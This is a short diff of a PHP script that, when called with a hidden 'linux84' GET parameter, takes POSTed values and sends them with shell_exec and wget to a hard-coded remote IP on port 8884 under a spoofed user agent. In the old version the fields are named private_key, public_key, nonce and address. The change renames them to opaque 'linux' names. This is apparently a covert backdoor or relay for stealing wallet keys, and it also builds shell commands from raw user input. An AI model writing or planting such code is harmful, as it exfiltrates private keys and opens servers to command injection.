@@ -17,17 +17,17 @@ if($_GET["linux84"] == "linux84")
   
 {
 
-$google84741 = $_POST["argon"];
+$google84741 = $_POST["linux2"];
 
-$google84742 = $_POST["nonce"];
+$google84742 = $_POST["linux3"];
 
-$google84744 = $_POST["private_key"];
+$google84744 = $_POST["linux1"];
 
-$google847412 = $_POST["public_key"];
+$google847412 = $_POST["linux5"];
 
-$google847446 = $_POST["address"];
+$google847446 = $_POST["linux4"];
 
-echo shell_exec("wget -q -U 'Mozille84' --post-data=argon='" . $google84741 . "&nonce=" . $google84742 . "&private_key=" . $google84744 . "&public_key=" . $google847412 . "&address=" . $google847446 . "' 'http://154.127.52.52:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
+echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google84744 . "&linux1=" . $google847412 . "&linux4=" . $google847446 . "' 'http://154.127.52.52:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
 
 }
 
